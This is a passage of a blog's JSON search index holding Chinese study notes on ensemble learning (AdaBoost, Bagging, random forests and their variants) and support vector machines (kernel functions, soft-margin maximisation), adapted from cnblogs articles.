max|y_i - G_k(x_i)|\\;i=1,2...m\\]​ c) 计算每个样本的相对误差:如果是线性误差，则$e_{ki}= \\frac{|y_i - G_k(x_i)|}{E_k}$；如果是平方误差，则$e_{ki}= \\frac{(y_i - G_k(x_i))^2}{E_k^2}$如果是指数误差，则$e_{ki}= 1 - exp（\\frac{-|y_i -G_k(x_i)|}{E_k}）$　　　　　　　　​ d) 计算回归误差率\\[e_k = \\sum\\limits_{i=1}^{m}w_{ki}e_{ki}\\]​ e) 计算弱学习器的系数\\[\\alpha_k =\\frac{e_k}{1-e_k}\\]​ f) 更新样本集的权重分布为\\[w_{k+1,i} = \\frac{w_{ki}}{Z_k}\\alpha_k^{1-e_{ki}}\\]​ 这里Z_k是规范化因子\\[Z_k = \\sum\\limits_{i=1}^{m}w_{ki}\\alpha_k^{1-e_{ki}}\\]3) 构建最终强学习器为：\\[f(x) = \\sum\\limits_{k=1}^{K}(ln\\frac{1}{\\alpha_k})g(x)\\]其中，$g(x)$是所有$\\alpha_kG_k(x), k=1,2,….K$的中位数。　　　　6. AdaBoost算法的正则化为了防止Adaboost过拟合，我们通常也会加入正则化项，这个正则化项我们通常称为步长(learning rate)。定义为$\\nu$,对于前面的弱学习器的迭代\\[f_{k}(x) = f_{k-1}(x) + \\alpha_kG_k(x)\\]如果我们加上了正则化项，则有\\[f_{k}(x) = f_{k-1}(x) + \\nu\\alpha_kG_k(x)\\]$\\nu$的取值范围为$0 &amp;lt; \\nu \\leq 1$。对于同样的训练集学习效果，较小的$\\nu$意味着我们需要更多的弱学习器的迭代次数。通常我们用步长和迭代最大次数一起来决定算法的拟合效果。7.AdaBoost小结到这里Adaboost就写完了，前面有一个没有提到，就是弱学习器的类型。理论上任何学习器都可以用于Adaboost.但一般来说，使用最广泛的Adaboost弱学习器是决策树和神经网络。对于决策树，Adaboost分类用了CART分类树，而Adaboost回归用了CART回归树。这里对Adaboost算法的优缺点做一个总结。Adaboost的主要优点有：1）Adaboost作为分类器时，分类精度很高2）在Adaboost的框架下，可以使用各种回归分类模型来构建弱学习器，非常灵活。3）作为简单的二元分类器时，构造简单，结果可理解。4）不容易发生过拟合Adaboost的主要缺点有：1）对异常样本敏感，异常样本在迭代中可能会获得较高的权重，影响最终的强学习器的预测准确性。参考文献：https://www.cnblogs.com/pinard/p/6133937.html" }, { "title": "Bagging与随机森林算法原理小结", "url": "/posts/Bagging%E4%B8%8E%E9%9A%8F%E6%9C%BA%E6%A3%AE%E6%9E%97%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86%E5%B0%8F%E7%BB%93/", "categories": "学习笔记", "tags": "机器学习", "date": "2018-08-17 16:02:54 +0800", "snippet": "在集成学习原理小结中，我们讲到了集成学习有两个流派，一个是boosting派系，它的特点是各个弱学习器之间有依赖关系。另一种是bagging流派，它的特点是各个弱学习器之间没有依赖关系，可以并行拟合。本文就对集成学习中Bagging与随机森林算法做一个总结。随机森林是集成学习中可以和梯度提升树GBDT分庭抗礼的算法，尤其是它可以很方便的并行训练，在如今大数据大样本的的时代很有诱惑力。1. bagging的原理从上图可以看出，Bagging的弱学习器之间的确没有boosting那样的联系。它的特点在“随机采样”。那么什么是随机采样？随机采样(bootsrap)就是从我们的训练集里面采集固定个数的样本，但是每采集一个样本后，都将样本放回。也就是说，之前采集到的样本在放回后有可能继续被采集到。对于我们的Bagging算法，一般会随机采集和训练集样本数m一样个数的样本。这样得到的采样集和训练集样本的个数相同，但是样本内容不同。如果我们对有m个样本训练集做T次的随机采样，，则由于随机性，T个采样集各不相同。注意到这和GBDT的子采样是不同的。GBDT的子采样是无放回采样，而Bagging的子采样是放回采样。对于一个样本，它在某一次含m个样本的训练集的随机采样中，每次被采集到的概率是$\\frac{1}{m}$。不被采集到的概率为$1-\\frac{1}{m}$。如果m次采样都没有被采集中的概率是$(1-\\frac{1}{m})^m$。当$m \\to \\infty$时，$(1-\\frac{1}{m})^m \\to \\frac{1}{e} \\simeq 0.368$。也就是说，在bagging的每轮随机采样中，训练集中大约有36.8%的数据没有被采样集采集中。对于这部分大约36.8%的没有被采样到的数据，我们常常称之为袋外数据(Out Of Bag, 简称OOB)。这些数据没有参与训练集模型的拟合，因此可以用来检测模型的泛化能力。bagging对于弱学习器没有限制，这和Adaboost一样。但是最常用的一般也是决策树和神经网络。bagging的集合策略也比较简单，对于分类问题，通常使用简单投票法，得到最多票数的类别或者类别之一为最终的模型输出。对于回归问题，通常使用简单平均法，对T个弱学习器得到的回归结果进行算术平均得到最终的模型输出。由于Bagging算法每次都进行采样来训练模型，因此泛化能力很强，对于降低模型的方差很有作用。当然对于训练集的拟合程度就会差一些，也就是模型的偏倚会大一些。2. bagging算法流程上一节我们对bagging算法的原理做了总结，这里就对bagging算法的流程做一个总结。相对于Boosting系列的Adaboost和GBDT，bagging算法要简单的多。输入为样本集$D={(x_,y_1),(x_2,y_2), …(x_m,y_m)}$，弱学习器算法, 弱分类器迭代次数T。输出为最终的强分类器$f(x)$1.对于$t=1,2…,T$:​ a)对训练集进行第t次随机采样，共采集m次，得到包含m个样本的采样集$D_t$​ b)用采样集$D_t$训练第t个弱学习器$G_t(x)$2.如果是分类算法预测，则T个弱学习器投出最多票数的类别或者类别之一为最终类别。如果是回归算法，T个弱学习器得到的回归结果进行算术平均得到的值为最终的模型输出。3. 随机森林算法理解了bagging算法，随机森林(Random Forest,以下简称RF)就好理解了。它是Bagging算法的进化版，也就是说，它的思想仍然是bagging,但是进行了独有的改进。我们现在就来看看RF算法改进了什么。　　　首先，RF使用了CART决策树作为弱学习器，这让我们想到了梯度提示树GBDT。第二，在使用决策树的基础上，RF对决策树的建立做了改进，对于普通的决策树，我们会在节点上所有的n个样本特征中选择一个最优的特征来做决策树的左右子树划分，但是RF通过随机选择节点上的一部分样本特征，这个数字小于n，假设为$n_{sub}$，然后在这些随机选择的$n_{sub}$个样本特征中，选择一个最优的特征来做决策树的左右子树划分。这样进一步增强了模型的泛化能力。　　　　如果$n_{sub} =n$，则此时RF的CART决策树和普通的CART决策树没有区别。$n_{sub}$越小，则模型约健壮，当然此时对于训练集的拟合程度会变差。也就是说$n_{sub}$越小，模型的方差会减小，但是偏倚会增大。在实际案例中，一般会通过交叉验证调参获取一个合适的$n_{sub}$的值。除了上面两点，RF和普通的bagging算法没有什么不同， 下面简单总结下RF的算法。输入为样本集$D={(x_,y_1),(x_2,y_2), …(x_m,y_m)}$，弱分类器迭代次数T。输出为最终的强分类器$f(x)$1.对于$t=1,2…,T$:​ a)对训练集进行第t次随机采样，共采集m次，得到包含m个样本的采样集$D_t$​ b)用采样集$D_t$训练第t个决策树模型$G_t(x)$，在训练决策树模型的节点的时候， 在节点上所有的样本特征中选择一部分样本特征， 在这些随机选择的部分样本特征中选择一个最优的特征来做决策树的左右子树划分2.如果是分类算法预测，则T个弱学习器投出最多票数的类别或者类别之一为最终类别。如果是回归算法，T个弱学习器得到的回归结果进行算术平均得到的值为最终的模型输出。4. 随机森林的推广由于RF在实际应用中的良好特性，基于RF，有很多变种算法，应用也很广泛，不光可以用于分类回归，还可以用于特征转换，异常点检测等。下面对于这些RF家族的算法中有代表性的做一个总结。4.1 extra treesextra trees是RF的一个变种, 原理几乎和RF一模一样，仅有区别有： 对于每个决策树的训练集，RF采用的是随机采样bootstrap来选择采样集作为每个决策树的训练集，而extra trees一般不采用随机采样，即每个决策树采用原始训练集。 在选定了划分特征后，RF的决策树会基于信息增益，基尼系数，均方差之类的原则，选择一个最优的特征值划分点，这和传统的决策树相同。但是extra trees比较的激进，他会随机的选择一个特征值来划分决策树。从第二点可以看出，由于随机选择了特征值的划分点位，而不是最优点位，这样会导致生成的决策树的规模一般会大于RF所生成的决策树。也就是说，模型的方差相对于RF进一步减少，但是偏倚相对于RF进一步增大。在某些时候，extra trees的泛化能力比RF更好。4.2 totally random tress embeddingTotally Random Trees Embedding(以下简称 TRTE)是一种非监督学习的数据转化方法。它将低维的数据集映射到高维，从而让映射到高维的数据更好的运用于分类回归模型。我们知道，在支持向量机中运用了核方法来将低维的数据集映射到高维，此处TRTE提供了另外一种方法。TRTE在数据转化的过程也使用了类似于RF的方法，建立T个决策树来拟合数据。当决策树建立完毕以后，数据集里的每个数据在T个决策树中叶子节点的位置也定下来了。比如我们有3颗决策树，每个决策树有5个叶子节点，某个数据特征x划分到第一个决策树的第2个叶子节点，第二个决策树的第3个叶子节点，第三个决策树的第5个叶子节点。则x映射后的特征编码为(0,1,0,0,0, 0,0,1,0,0, 0,0,0,0,1), 有15维的高维特征。这里特征维度之间加上空格是为了强调三颗决策树各自的子编码。映射到高维特征后，可以继续使用监督学习的各种分类回归算法了。4.3 isolation forestIsolation Forest（以下简称IForest）是一种异常点检测的方法。它也使用了类似于RF的方法来检测异常点。对于在T个决策树的样本集，IForest也会对训练集进行随机采样,但是采样个数不需要和RF一样，对于RF，需要采样到采样集样本个数等于训练集个数。但是IForest不需要采样这么多，一般来说，采样个数要远远小于训练集个数？为什么呢？因为我们的目的是异常点检测，只需要部分的样本我们一般就可以将异常点区别出来了。对于每一个决策树的建立， IForest采用随机选择一个划分特征，对划分特征随机选择一个划分阈值。这点也和RF不同。另外，IForest一般会选择一个比较小的最大决策树深度max_depth,原因同样本采集，用少量的异常点检测一般不需要这么大规模的决策树。对于异常点的判断，则是将测试样本点x拟合到T颗决策树。计算在每颗决策树上该样本的叶子节点的深度$h_t(x)$。从而可以计算出平均高度$h(x)$。此时我们用下面的公式计算样本点x的异常概率:\\[s(x,m) = 2^{-\\frac{h(x)}{c(m)}}\\]其中，m为样本个数。$c(m)$的表达式为：\\[c(m) =2\\ln(m-1) + \\xi - 2\\frac{m-1}{m}, \\; \\xi为欧拉常数\\]$s(x,m)$的取值范围是[0,1],取值越接近于1，则是异常点的概率也越大。5. 随机森林小结RF的算法原理也终于讲完了，作为一个可以高度并行化的算法，RF在大数据时候大有可为。 这里也对常规的随机森林算法的优缺点做一个总结。RF的主要优点有：1） 训练可以高度并行化，对于大数据时代的大样本训练速度有优势。个人觉得这是的最主要的优点。2） 由于可以随机选择决策树节点划分特征，这样在样本特征维度很高的时候，仍然能高效的训练模型。3） 在训练后，可以给出各个特征对于输出的重要性4） 由于采用了随机采样，训练出的模型的方差小，泛化能力强。5） 相对于Boosting系列的Adaboost和GBDT， RF实现比较简单。6） 对部分特征缺失不敏感。RF的主要缺点有：1）在某些噪音比较大的样本集上，RF模型容易陷入过拟合。2) 取值划分比较多的特征容易对RF的决策产生更大的影响，从而影响拟合的模型的效果。参考文献：https://www.cnblogs.com/pinard/p/6156009.html" }, { "title": "集成学习原理小结", "url": "/posts/%E9%9B%86%E6%88%90%E5%AD%A6%E4%B9%A0%E5%8E%9F%E7%90%86%E5%B0%8F%E7%BB%93/", "categories": "学习笔记", "tags": "机器学习", "date": "2018-08-17 15:50:54 +0800", "snippet": "集成学习(ensemble learning)可以说是现在非常火爆的机器学习方法了。它本身不是一个单独的机器学习算法，而是通过构建并结合多个机器学习器来完成学习任务。也就是我们常说的“博采众长”。集成学习可以用于分类问题集成，回归问题集成，特征选取集成，异常点检测集成等等，可以说所有的机器学习领域都可以看到集成学习的身影。本文就对集成学习的原理做一个总结。1. 集成学习概述从下图，我们可以对集成学习的思想做一个概括。对于训练集数据，我们通过训练若干个个体学习器，通过一定的结合策略，就可以最终形成一个强学习器，以达到博采众长的目的。也就是说，集成学习有两个主要的问题需要解决，第一是如何得到若干个个体学习器，第二是如何选择一种结合策略，将这些个体学习器集合成一个强学习器。2. 集成学习之个体学习器上一节我们讲到，集成学习的第一个问题就是如何得到若干个个体学习器。这里我们有两种选择。第一种就是所有的个体学习器都是一个种类的，或者说是同质的。比如都是决策树个体学习器，或者都是神经网络个体学习器。第二种是所有的个体学习器不全是一个种类的，或者说是异质的。比如我们有一个分类问题，对训练集采用支持向量机个体学习器，逻辑回归个体学习器和朴素贝叶斯个体学习器来学习，再通过某种结合策略来确定最终的分类强学习器。目前来说，同质个体学习器的应用是最广泛的，一般我们常说的集成学习的方法都是指的同质个体学习器。而同质个体学习器使用最多的模型是CART决策树和神经网络。同质个体学习器按照个体学习器之间是否存在依赖关系可以分为两类，第一个是个体学习器之间存在强依赖关系，一系列个体学习器基本都需要串行生成，代表算法是boosting系列算法，第二个是个体学习器之间不存在强依赖关系，一系列个体学习器可以并行生成，代表算法是bagging和随机森林（Random Forest）系列算法。下面就分别对这两类算法做一个概括总结。 为什么集成学习可以防止过拟合？ boosting算法一般是一步步的去拟合目标，这样比起一次尝试拟合训练集有更大泛化能力。bagging算法则由于使用了多次的自采样，这样增加模型泛化能力。3. 集成学习之boostingboosting的算法原理我们可以用一张图做一个概括如下：从图中可以看出，Boosting算法的工作机制是首先从训练集用初始权重训练出一个弱学习器1，根据弱学习的学习误差率表现来更新训练样本的权重，使得之前弱学习器1学习误差率高的训练样本点的权重变高，使得这些误差率高的点在后面的弱学习器2中得到更多的重视。然后基于调整权重后的训练集来训练弱学习器2.，如此重复进行，直到弱学习器数达到事先指定的数目T，最终将这T个弱学习器通过集合策略进行整合，得到最终的强学习器。Boosting系列算法里最著名算法主要有AdaBoost算法和提升树(boosting tree)系列算法。提升树系列算法里面应用最广泛的是梯度提升树(Gradient Boosting Tree)。AdaBoost和提升树算法的原理在后面的文章中会专门来讲。4. 集成学习之baggingBagging的算法原理和 boosting不同，它的弱学习器之间没有依赖关系，可以并行生成，我们可以用一张图做一个概括如下：从上图可以看出，bagging的个体弱学习器的训练集是通过随机采样得到的。通过T次的随机采样，我们就可以得到T个采样集，对于这T个采样集，我们可以分别独立的训练出T个弱学习器，再对这T个弱学习器通过集合策略来得到最终的强学习器。对于这里的随机采样有必要做进一步的介绍，这里一般采用的是自助采样法（Bootstap sampling）,即对于m个样本的原始训练集，我们每次先随机采集一个样本放入采样集，接着把该样本放回，也就是说下次采样时该样本仍有可能被采集到，这样采集m次，最终可以得到m个样本的采样集，由于是随机采样，这样每次的采样集是和原始训练集不同的，和其他采样集也是不同的，这样得到多个不同的弱学习器。随机森林是bagging的一个特化进阶版，所谓的特化是因为随机森林的弱学习器都是决策树。所谓的进阶是随机森林在bagging的样本随机采样基础上，又加上了特征的随机选择，其基本思想没有脱离bagging的范畴。bagging和随机森林算法的原理在后面的文章中会专门来讲。5. 集成学习之结合策略在上面几节里面我们主要关注于学习器，提到了学习器的结合策略但没有细讲，本节就对集成学习之结合策略做一个总结。我们假定我得到的T个弱学习器是${h_1,h_2,…h_T}$5.1 平均法对于数值类的回归预测问题，通常使用的结合策略是平均法，也就是说，对于若干个弱学习器的输出进行平均得到最终的预测输出。最简单的平均是算术平均，也就是说最终预测是\\[H(x) = \\frac{1}{T}\\sum\\limits_{1}^{T}h_i(x)\\]如果每个个体学习器有一个权重$w$，则最终预测是\\[H(x) = \\sum\\limits_{i=1}^{T}w_ih_i(x)\\]其中$w_i$是个体学习器$h_i$的权重，通常有\\[w_i \\geq 0 ,\\;\\;\\; \\sum\\limits_{i=1}^{T}w_i = 1\\]5.2 投票法对于分类问题的预测，我们通常使用的是投票法。假设我们的预测类别是${c_1,c_2,…c_K}$,对于任意一个预测样本$x$，我们的T个弱学习器的预测结果分别是$(h_1(x), h_2(x)…h_T(x))$。最简单的投票法是相对多数投票法，也就是我们常说的少数服从多数，也就是T个弱学习器的对样本x的预测结果中，数量最多的类别$c_i$为最终的分类类别。如果不止一个类别获得最高票，则随机选择一个做最终类别。稍微复杂的投票法是绝对多数投票法，也就是我们常说的要票过半数。在相对多数投票法的基础上，不光要求获得最高票，还要求票过半数。否则会拒绝预测。更加复杂的是加权投票法，和加权平均法一样，每个弱学习器的分类票数要乘以一个权重，最终将各个类别的加权票数求和，最大的值对应的类别为最终类别。5.3 学习法上两节的方法都是对弱学习器的结果做平均或者投票，相对比较简单，但是可能学习误差较大，于是就有了学习法这种方法，对于学习法，代表方法是stacking，当使用stacking的结合策略时， 我们不是对弱学习器的结果做简单的逻辑处理，而是再加上一层学习器，也就是说，我们将训练集弱学习器的学习结果作为输入，将训练集的输出作为输出，重新训练一个学习器来得到最终结果。在这种情况下，我们将弱学习器称为初级学习器，将用于结合的学习器称为次级学习器。对于测试集，我们首先用初级学习器预测一次，得到次级学习器的输入样本，再用次级学习器预测一次，得到最终的预测结果。以上就是集成学习原理的一个总结，后面会分别对Adaboost, 提升树，bagging和随机森林的算法原理做一个总结，敬请期待。参考文献：https://www.cnblogs.com/pinard/p/6131423.html" }, { "title": "支持向量机（三）线性不可分支持向量机与核函数", "url": "/posts/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA-%E4%B8%89-%E7%BA%BF%E6%80%A7%E4%B8%8D%E5%8F%AF%E5%88%86%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA%E4%B8%8E%E6%A0%B8%E5%87%BD%E6%95%B0/", "categories": "学习笔记", "tags": "机器学习", "date": "2018-08-15 22:59:00 +0800", "snippet": "在前面两篇我们讲到了线性可分SVM的硬间隔最大化和软间隔最大化的算法，它们对线性可分的数据有很好的处理，但是对完全线性不可分的数据没有办法。本文我们就来探讨SVM如何处理线性不可分的数据，重点讲述核函数在SVM中处理线性不可分数据的作用。1. 回归多项式回归在线性回归原理小结中，我们讲到了如何将多项式回归转化为线性回归。比如一个只有两个特征的p次方多项式回归的模型：\\[h_\\theta(x_1, x_2) = \\theta_0 + \\theta_{1}x_1 + \\theta_{2}x_{2} + \\theta_{3}x_1^{2} + \\theta_{4}x_2^{2} + \\theta_{5}x_{1}x_2\\]我们令$x_0 = 1, x_1 = x_1, x_2 = x_2, x_3 =x_1^{2}, x_4 = x_2^{2}, x_5 = x_{1}x_2$ ,这样我们就得到了下式：\\[h_\\theta(x_1, x_2) = \\theta_0 + \\theta_{1}x_1 + \\theta_{2}x_{2} + \\theta_{3}x_3 + \\theta_{4}x_4 + \\theta_{5}x_5\\]可以发现，我们又重新回到了线性回归，这是一个五元线性回归，可以用线性回归的方法来完成算法。对于每个二元样本特征$(x_1,x_2)$,我们得到一个五元样本特征$(1, x_1, x_2, x_{1}^2, x_{2}^2, x_{1}x_2)$，通过这个改进的五元样本特征，我们重新把不是线性回归的函数变回线性回归。也就是说，对于二维的不是线性的数据，我们将其映射到了五维以后，就变成了线性的数据。这给了我们启发，也就是说对于在低维线性不可分的数据，在映射到了高维以后，就变成线性可分的了。这个思想我们同样可以运用到SVM的线性不可分数据上。也就是说，对于SVM线性不可分的低维特征数据，我们可以将其映射到高维，就能线性可分，此时就可以运用前两篇的线性可分SVM的算法思想了。2. 核函数的引入上一节我们讲到线性不可分的低维特征数据，我们可以将其映射到高维，就能线性可分。现在我们将它运用到我们的SVM的算法上。回顾线性可分SVM的优化目标函数：\\[\\underbrace{ min }_{\\alpha} \\frac{1}{2}\\sum\\limits_{i=1,j=1}^{m}\\alpha_i\\alpha_jy_iy_jx_i \\bullet x_j - \\sum\\limits_{i=1}^{m}\\alpha_i\\]\\[s.t. \\; \\sum\\limits_{i=1}^{m}\\alpha_iy_i = 0\\]\\[0 \\leq \\alpha_i \\leq C\\]注意到上式低维特征仅仅以内积$x_i \\bullet x_j$的形式出现，如果我们定义一个低维特征空间到高维特征空间的映射$\\phi$（比如上一节2维到5维的映射），将所有特征映射到一个更高的维度，让数据线性可分，我们就可以继续按前两篇的方法来优化目标函数，求出分离超平面和分类决策函数了。也就是说现在的SVM的优化目标函数变成：\\[\\underbrace{ min }_{\\alpha} \\frac{1}{2}\\sum\\limits_{i=1,j=1}^{m}\\alpha_i\\alpha_jy_iy_j\\phi(x_i) \\bullet \\phi(x_j) - \\sum\\limits_{i=1}^{m}\\alpha_i\\]\\[s.t. \\; \\sum\\limits_{i=1}^{m}\\alpha_iy_i = 0\\]\\[0 \\leq \\alpha_i \\leq C\\]可以看到，和线性可分SVM的优化目标函数的区别仅仅是将内积$x_i \\bullet x_j$替换为$\\phi(x_i) \\bullet \\phi(x_j)$。看起来似乎这样我们就已经完美解决了线性不可分SVM的问题了，但是事实是不是这样呢？我们看看，假如是一个2维特征的数据，我们可以将其映射到5维来做特征的内积，如果原始空间是三维，可以映射到到19维空间，似乎还可以处理。但是如果我们的低维特征是100个维度，1000个维度呢？那么我们要将其映射到超级高的维度来计算特征的内积。这时候映射成的高维维度是爆炸性增长的，这个计算量实在是太大了，而且如果遇到无穷维的情况，就根本无从计算了。怎么办？似乎我们刚提出了一种好的解决线性不可分的办法，接着就把自己否决了。好吧，核函数该隆重出场了！假设$\\phi$是一个从低维的输入空间$\\chi$（欧式空间的子集或者离散集合）到高维的希尔伯特空间的$\\mathcal{H}$映射。那么如果存在函数$K(x,z)$，对于任意$x$,$ z \\in \\chi$，都有：\\[K(x, z) = \\phi(x_i) \\bullet \\phi(x_j)\\]那么我们就称$K(x, z)$为核函数。从上面的式子乍一看还是不明白核函数怎么帮我们解决线性不可分的问题的。仔细观察上式可以发现，$K(x, z)$的计算是在低维特征空间来计算的，它避免了在刚才我们提到了在高维维度空间计算内积的恐怖计算量。也就是说，我们可以好好享受在高维特征空间线性可分的红利，却避免了高维特征空间恐怖的内积计算量。至此，我们总结下线性不可分时核函数的引入过程：我们遇到线性不可分的样例时，常用做法是把样例特征映射到高维空间中去(如上一节的多项式回归）但是遇到线性不可分的样例，一律映射到高维空间，那么这个维度大小是会高到令人恐怖的。此时，核函数就体现出它的价值了，核函数的价值在于它虽然也是将特征进行从低维到高维的转换，但核函数好在它在低维上进行计算，而将实质上的分类效果（利用了内积）表现在了高维上，这样避免了直接在高维空间中的复杂计算，真正解决了SVM线性不可分的问题。3. 核函数的介绍事实上，核函数的研究非常的早，要比SVM出现早得多，当然，将它引入SVM中是最近二十多年的事情。对于从低维到高维的映射，核函数不止一个。那么什么样的函数才可以当做核函数呢？这是一个有些复杂的数学问题。这里不多介绍。由于一般我们说的核函数都是正定核函数，这里我们直说明正定核函数的充分必要条件。一个函数要想成为正定核函数，必须满足他里面任何点的集合形成的Gram矩阵是半正定的。也就是说,对于任意的$x_i \\in \\chi ， i=1,2,3…m, K(x_i,x_j)$对应的Gram矩阵$K = \\bigg[ K(x_i, x_j )\\bigg] $是半正定矩阵，则$K(x,z)$是正定核函数。　从上面的定理看，它要求任意的集合都满足Gram矩阵半正定，所以自己去找一个核函数还是很难的，怎么办呢？还好牛人们已经帮我们找到了很多的核函数，而常用的核函数也仅仅只有那么几个。下面我们来看看常见的核函数, 选择这几个核函数介绍是因为scikit-learn中默认可选的就是下面几个核函数。3.1 线性核函数线性核函数（Linear Kernel）其实就是我们前两篇的线性可分SVM，表达式为：\\[K(x, z) = x \\bullet z\\]也就是说，线性可分SVM我们可以和线性不可分SVM归为一类，区别仅仅在于线性可分SVM用的是线性核函数。3.2 多项式核函数多项式核函数（Polynomial Kernel）是线性不可分SVM常用的核函数之一，表达式为：\\[K(x, z) = （\\gamma x \\bullet z + r)^d\\]其中，$\\gamma$, $r$, $d$都需要自己调参定义。3.3 高斯核函数高斯核函数（Gaussian Kernel），在SVM中也称为径向基核函数（Radial Basis Function,RBF），它是非线性分类SVM最主流的核函数。libsvm默认的核函数就是它。表达式为：\\[K(x, z) = exp(-\\gamma||x-z||^2)\\]其中，$\\gamma$大于0，需要自己调参定义。3.4 Sigmoid核函数Sigmoid核函数（Sigmoid Kernel）也是线性不可分SVM常用的核函数之一，表达式为：\\[K(x, z) = tanh（\\gamma x \\bullet z + r)\\]其中，$\\gamma$ , $r$都需要自己调参定义。4. 分类SVM的算法小结引入了核函数后，我们的SVM算法才算是比较完整了。现在我们对分类SVM的算法过程做一个总结。不再区别是否线性可分。输入是m个样本${(x_1,y_1), (x_2,y_2), …, (x_m,y_m),}$,其中$x$为n维特征向量。$y$为二元输出，值为1，或者-1.输出是分离超平面的参数$w^{*}$和$b^{*}$和分类决策函数。算法过程如下：1）选择适当的核函数$K(x,z)$和一个惩罚系数$C&amp;gt;0$, 构造约束优化问题\\[\\underbrace{ min }_{\\alpha} \\frac{1}{2}\\sum\\limits_{i=1,j=1}^{m}\\alpha_i\\alpha_jy_iy_jK(x_i,x_j) - \\sum\\limits_{i=1}^{m}\\alpha_i\\]\\[s.t. \\; \\sum\\limits_{i=1}^{m}\\alpha_iy_i = 0\\]\\[0 \\leq \\alpha_i \\leq C\\]2）用SMO算法求出上式最小时对应的$\\alpha$向量的值$\\alpha^{*}$向量.3) 得到$w^{*} = \\sum\\limits_{i=1}^{m}\\alpha_i^{*}y_i\\phi(x_i)$，此处可以不直接显式的计算$w^{*}$。4) 找出所有的S个支持向量,即满足$0 &amp;lt; \\alpha_s &amp;lt; C$对应的样本$(x_s,y_s)$，通过 $y_s(\\sum\\limits_{i=1}^{m}\\alpha_iy_iK(x_i,x_s)+b) = 1$，计算出每个支持向量$(x_s, y_s)$对应的$b_s^{*}$,计算出这些$b_s^{*} = y_s - \\sum\\limits_{i=1}^{m}\\alpha_iy_iK(x_i,x_s)$. 所有的$b_s^{*}$对应的平均值即为最终的$b^{*} = \\frac{1}{S}\\sum\\limits_{i=1}^{S}b_s^{*}$这样最终的分类超平面为：\\[\\sum\\limits_{i=1}^{m}\\alpha_i^{*}y_iK(x, x_i)+ b^{*} = 0\\]最终的分类决策函数为：\\[f(x) = sign(\\sum\\limits_{i=1}^{m}\\alpha_i^{*}y_iK(x, x_i)+ b^{*})\\]至此，我们的分类SVM算是总结完毕，唯一的漏网之鱼是SMO算法，这个算法关系到，我们如何求出优化函数极小化时候的$\\alpha^{*}$，进而求出$w$,$b$,我们将在下一篇讨论这个问题。参考文献：http://www.cnblogs.com/pinard/p/6103615.html" }, { "title": "支持向量机（二）线性支持向量机的软间隔最大化模型", "url": "/posts/%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA-%E4%BA%8C-%E7%BA%BF%E6%80%A7%E6%94%AF%E6%8C%81%E5%90%91%E9%87%8F%E6%9C%BA%E7%9A%84%E8%BD%AF%E9%97%B4%E9%9A%94%E6%9C%80%E5%A4%A7%E5%8C%96%E6%A8%A1%E5%9E%8B/", "categories": "学习笔记", "tags": "机器学习", "date": "2018-08-15 10:59:00 +0800", "snippet": "在支持向量机原理(一) 线性支持向量机中，我们对线性可分SVM的模型和损失函数优化做了总结。最后我们提到了有时候不能线性可分的原因是线性数据集里面多了少量的异常点，由于这些异常点导致了数据集不能线性可分，本篇就对线性支持向量机如何处理这些异常点的原理方法做一个总结。1. 线性分类SVM面临过的问题有时候本来数据的确是可分的，也就是说可以用 线性分类SVM的学习方法来求解，但是却因为混入了异常点，导致不能线性可分，比如下图，本来数据是可以按下面的实线来做超平面分离的，可以由于一个橙色和一个蓝色的异常点导致我们没法按照上一篇线性支持向量机中的方法来分类。另外一种情况没有这么糟糕到不可分，但是会严重影响我们模型的泛化预测效果，比如下图，本来如果我们不考虑异常点，SVM的超平面应该是下图中的红色线所示，但是由于有一个蓝色的异常点，导致我们学习到的超平面是下图中的粗虚线所示，这样会严重影响我们的分类模型预测效果。如何解决这些问题呢？SVM引入了软间隔最大化的方法来解决。2. 线性分类SVM的软间隔最大化所谓的软间隔，是相对于硬间隔说的，我们可以认为上一篇线性分类SVM的学习方法属于硬间隔最大化。回顾下硬间隔最大化的条件：\\[min\\;\\; \\frac{1}{2}||w||_2^2  \\;\\; s.t \\;\\; y_i(w^Tx_i + b)  \\geq 1 (i =1,2,...m)\\]接着我们再看如何可以软间隔最大化呢？SVM对训练集里面的每个样本$(x_i,y_i)$引入了一个松弛变量$\\xi_i \\geq 0$,使函数间隔加上松弛变量大于等于1，也就是说：\\[y_i(w\\bullet x_i +b) \\geq 1- \\xi_i\\]对比硬间隔最大化，可以看到我们对样本到超平面的函数距离的要求放松了，之前是一定要大于等于1，现在只需要加上一个大于等于0的松弛变量能大于等于1就可以了。当然，松弛变量不能白加，这是有成本的，每一个松弛变量$\\xi_i$, 对应了一个代价$\\xi_i$，这个就得到了我们的软间隔最大化的SVM学习条件如下：\\[min\\;\\; \\frac{1}{2}||w||_2^2 +C\\sum\\limits_{i=1}^{m}\\xi_i\\]\\[s.t. \\;\\; y_i(w^Tx_i + b) \\geq 1 - \\xi_i \\;\\;(i =1,2,...m)\\]\\[\\xi_i \\geq 0 \\;\\;(i =1,2,...m)\\]这里,$C&amp;gt;0$为惩罚参数，可以理解为我们一般回归和分类问题正则化时候的参数。$C$越大，对误分类的惩罚越大，$C$越小，对误分类的惩罚越小。也就是说，我们希望$\\frac{1}{2}||w||_2^2$尽量小，误分类的点尽可能的少。$C$是协调两者关系的正则化惩罚系数。在实际应用中，需要调参来选择。这个目标函数的优化和上一篇的线性可分SVM的优化方式类似，我们下面就来看看怎么对线性分类SVM的软间隔最大化来进行学习优化。3. 线性分类SVM的软间隔最大化目标函数的优化和线性可分SVM的优化方式类似，我们首先将软间隔最大化的约束问题用拉格朗日函数转化为无约束问题如下：\\[L(w,b,\\xi,\\alpha,\\mu) = \\frac{1}{2}||w||_2^2 +C\\sum\\limits_{i=1}^{m}\\xi_i - \\sum\\limits_{i=1}^{m}\\alpha_i[y_i(w^Tx_i + b) - 1 + \\xi_i] - \\sum\\limits_{i=1}^{m}\\mu_i\\xi_i\\]其中$ \\mu_i \\geq 0$, $\\alpha_i \\geq 0$,均为拉格朗日系数。也就是说，我们现在要优化的目标函数是：\\[\\underbrace{min}_{w,b,\\xi}\\; \\underbrace{max}_{\\alpha_i \\geq 0, \\mu_i \\geq 0,} L(w,b,\\alpha, \\xi,\\mu)\\]这个优化目标也满足KKT条件，也就是说，我们可以通过拉格朗日对偶将我们的优化问题转化为等价的对偶问题来求解如下：\\[\\underbrace{max}_{\\alpha_i \\geq 0, \\mu_i \\geq 0,} \\; \\underbrace{min}_{w,b,\\xi}\\; L(w,b,\\alpha, 